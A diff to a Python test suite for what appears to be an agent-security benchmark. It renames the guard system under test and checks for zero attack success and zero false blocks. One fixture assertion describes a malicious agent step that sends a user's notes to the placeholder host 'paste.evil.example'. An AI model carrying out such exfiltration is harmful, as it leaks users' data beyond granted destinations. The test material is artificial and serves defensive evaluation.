@@ -31,7 +31,7 @@ def write(tmp_path, name, text):
 def test_external_episodes_load_and_run():
     eps = load_external(FIX)
     assert [e.id for e in eps] == ["E-ex1", "E-ex2"] and all(e.author for e in eps)
-    s = summarize(run_system("intentguard_full", eps))
+    s = summarize(run_system("veritask_full", eps))
     assert s["asr"] == 0.0 and s["fpr_block"] == 0.0
 
 
@@ -44,7 +44,7 @@ def test_the_starter_template_is_itself_valid_and_runs(tmp_path):
     assert mal.steps[1].args == {"url": "paste.evil.example", "data": "the notes"}
     assert mal.grants == {"resources": ["research/*"], "destinations": ["advisor@university.edu"],
                           "max_classification": "INTERNAL", "project_root": "research/"}
-    assert summarize(run_system("intentguard_full", eps))["asr"] == 0.0
+    assert summarize(run_system("veritask_full", eps))["asr"] == 0.0
 
 
 def test_cards_read_flags_quotes_inline_notes_and_raw_commands():
